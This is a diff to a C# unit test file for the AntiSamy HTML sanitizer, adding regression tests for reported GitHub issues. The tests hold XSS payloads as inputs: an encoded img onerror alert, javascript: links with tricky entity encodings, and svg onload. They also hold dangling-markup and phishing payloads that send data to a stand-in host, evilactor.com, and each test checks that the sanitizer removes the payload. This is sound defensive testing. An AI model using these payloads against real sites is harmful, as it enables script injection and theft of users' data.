@@ -264,9 +264,8 @@ namespace AntiSamyTests
             antisamy.Scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2).GetCleanHtml().Should().Be("<div>text <!-- comment --></div>");
 
             /*
-            * Check to see how nested conditional comments are handled. This is
-            * not very clean but the main goal is to avoid any tags. Not sure
-            * on encodings allowed in comments.
+            * Check to see how nested conditional comments are handled. This is not very clean but 
+            * the main goal is to avoid any tags. Not sure on encodings allowed in comments.
             */
             antisamy.Scan("<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>", revised2).GetCleanHtml()
                 .Should().Be("<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>");
@@ -576,6 +575,141 @@ namespace AntiSamyTests
 
             using var resultReader = new StreamReader(writer.BaseStream);
             resultReader.ReadToEnd().Should().Be($"whatever{testImgSrcUrl}/>");
+        }
+
+        [Test(Description = "Tests issue #23 from nahsra/antisamy on GitHub.")]
+        public void TestStrippingNestedLists()
+        {
+            const string html = "<ul><li>one</li><li>two</li><li>three<ul><li>a</li><li>b</li></ul></li></ul>";
+            /* Issue claims you end up with this:
+             *      <ul><li>one</li><li>two</li><li>three<ul></ul></li><li>a</li><li>b</li></ul>
+             *      
+             * Meaning the <li>a</li><li>b</li> elements were moved outside of the nested <ul> list they were in
+             */
+
+            // The replace is used to strip out all the whitespace in the clean HTML so we can successfully find what we expect to find
+            antisamy.Scan(html, policy).GetCleanHtml().Replace("\\s", "").Should().Contain("<ul><li>a</li>");
+        }
+
+        [Test(Description = "Tests issue #24 from nahsra/antisamy on GitHub.")]
+        [Ignore("This issue is a valid enhancement request planned to implement in the future. Now it is ignored to pass CI.")]
+        public void TestOnUnknownTagEncodingBehaviorWithAtSymbol()
+        {
+            // If we have onUnknownTag set to "encode", it still strips out the @ and everything else after it.
+            // DOM Parser actually rips out the entire <name@mail.com> value even with onUnknownTag set.
+            Policy revised = policy.CloneWithDirective("onUnknownTag", Constants.ACTION_ENCODE);
+            antisamy.Scan("firstname,lastname<name@mail.com>", revised).GetCleanHtml().Should().Contain("name@mail.com");
+        }
+
+        [Test(Description = "Tests issue #26 from nahsra/antisamy on GitHub.")]
+        public void TestPotentialXssFalsePositive()
+        {
+            const string html = "&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x20;&#x6F;" +
+                "&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;";
+            // Issue claims you end up with this: ><img src=a onerror=alert(1)>
+            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("<img src=a onerror=alert(1)>");
+            // But you actually end up with this: &quot;&gt;&lt;img src=a onerror=alert(1)&gt; -- Which is as expected
+        }
+
+        [Test(Description = "Tests issue #27 from nahsra/antisamy on GitHub.")]
+        public void TestOutOfBoundsExceptionOnSimpleText()
+        {
+            // This test doesn't cause an OutOfBoundsException, as reported in this issue even though it replicates the test as described.
+            antisamy.Scan("my &test", policy).GetCleanHtml().Should().Contain("test");
+        }
+
+        [Test(Description = "Tests issue #33 from nahsra/antisamy on GitHub.")]
+        public void TestTrickyEncodingXssBypassTrial()
+        {
+            /* Issue claims you end up with this:
+             *   javascript:x=alert and other similar problems (javascript&#00058x=alert,x%281%29) but you don't.
+             *   So issue is a false positive and has been closed.
+             */
+            const string html = "<html>\n"
+                + "<head>\n"
+                + "  <title>Test</title>\n"
+                + "</head>\n"
+                + "<body>\n"
+                + "  <h1>Tricky Encoding</h1>\n"
+                + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
+                + "  <ol>\n"
+                + "    <li><a href=\"javascript&#00058x=alert,x%281%29\">X&#00058;x</a></li>\n"
+                + "    <li><a href=\"javascript&#00058y=alert,y%281%29\">X&#00058;y</a></li>\n"
+                + "    <li><a href=\"javascript&#58x=alert,x%281%29\">X&#58;x</a></li>\n"
+                + "    <li><a href=\"javascript&#58y=alert,y%281%29\">X&#58;y</a></li>\n"
+                + "    <li><a href=\"javascript&#x0003Ax=alert,x%281%29\">X&#x0003A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#x0003Ay=alert,y%281%29\">X&#x0003A;y</a></li>\n"
+                + "    <li><a href=\"javascript&#x3Ax=alert,x%281%29\">X&#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#x3Ay=alert,y%281%29\">X&#x3A;y</a></li>\n"
+                + "  </ol>\n"
+                + "  <h1>Tricky Encoding with Ampersand Encoding</h1>\n"
+                + "  <p>AntiSamy turns harmless payload into XSS by just decoding the encoded ampersands in the href attribute</a>\n"
+                + "  <ol>\n"
+                + "    <li><a href=\"javascript&amp;#x3Ax=alert,x%281%29\">X&amp;#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&AMP;#x3Ax=alert,x%281%29\">X&AMP;#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#38;#x3Ax=alert,x%281%29\">X&#38;#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#00038;#x3Ax=alert,x%281%29\">X&#00038;#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#x26;#x3Ax=alert,x%281%29\">X&#x26;#x3A;x</a></li>\n"
+                + "    <li><a href=\"javascript&#x00026;#x3Ax=alert,x%281%29\">X&#x00026;#x3A;x</a></li>\n"
+                + "  </ol>\n"
+                + "  <p><a href=\"javascript&#x3Ax=alert,x%281%29\">Original without ampersand encoding</a></p>\n"
+                + "</body>\n"
+                + "</html>";
+            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("javascript&#00058x=alert,x%281%29");
+        }
+
+        [Test(Description = "Tests issue #34 from nahsra/antisamy on GitHub.")]
+        public void TestStripNonValidXmlCharacters()
+        {
+            // Issue indicates: "<div>Hello\\uD83D\\uDC95</div>" should be sanitized to: "<div>Hello</div>"
+            antisamy.Scan("<div>Hello\uD83D\uDC95</div>", policy).GetCleanHtml().Should().Be("<div>Hello</div>");
+            antisamy.Scan("\uD888", policy).GetCleanHtml().Should().BeEmpty();
+        }
+
+        [Test(Description = "Tests issue #40 from nahsra/antisamy on GitHub.")]
+        public void TestCleaningSvgFalsePositive()
+        {
+            // Concern is that: <svg onload=alert(1)//  does not get cleansed.
+            // Based on these test results, it does get cleaned so this issue is a false positive, so we closed it.
+            const string html = "<html>\n"
+                + "<head>\n"
+                + "  <title>Test</title>\n"
+                + "</head>\n"
+                + "<body>\n"
+                + "  <h1>Tricky Encoding</h1>\n"
+                + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
+                + "  <ol>\n"
+                + "    <li><h3>svg onload=alert follows:</h3><svg onload=alert(1)//</li>\n"
+                + "  </ol>\n"
+                + "</body>\n"
+                + "</html>";
+
+            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("<svg onload=alert(1)//");
+        }
+
+        [Test(Description = "Tests issue #48 from nahsra/antisamy on GitHub.")]
+        public void TestOnsiteUrlAttacks()
+        {
+            // Concern is that onsiteURL regex is not safe for URLs that start with //.
+            // For example:  //evilactor.com?param=foo
+            const string phishingAttempt = "<a href=\"//evilactor.com/stealinfo?a=xxx&b=xxx\"><span style=\"color:red;font-size:100px\">"
+                + "You must click me</span></a>";
+            // Output: <a rel="nofollow"><span style="color: red;font-size: 100.0px;">You must click me</span></a>
+            antisamy.Scan(phishingAttempt, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");
+
+            // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.
+            // Less probable case (steal more tags):
+            const string danglingMarkup = "<div>User input: " +
+                "<input type=\"text\" name=\"input\" value=\"\"><a href='//evilactor.com?" +
+                "\"> all this info wants to be stolen with <i>danlging markup attack</i>" +
+                " until a single quote to close is found'</div>";
+            antisamy.Scan(danglingMarkup, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");
+
+            // More probable case (steal just an attribute):
+            //      HTML before attack: <input type="text" name="input" value="" data-attribute-to-steal="some value">
+            const string danglingMarkup2 = "<div>User input: " +
+                    "<input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">";
+            antisamy.Scan(danglingMarkup2, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");
         }
 
         [Test]
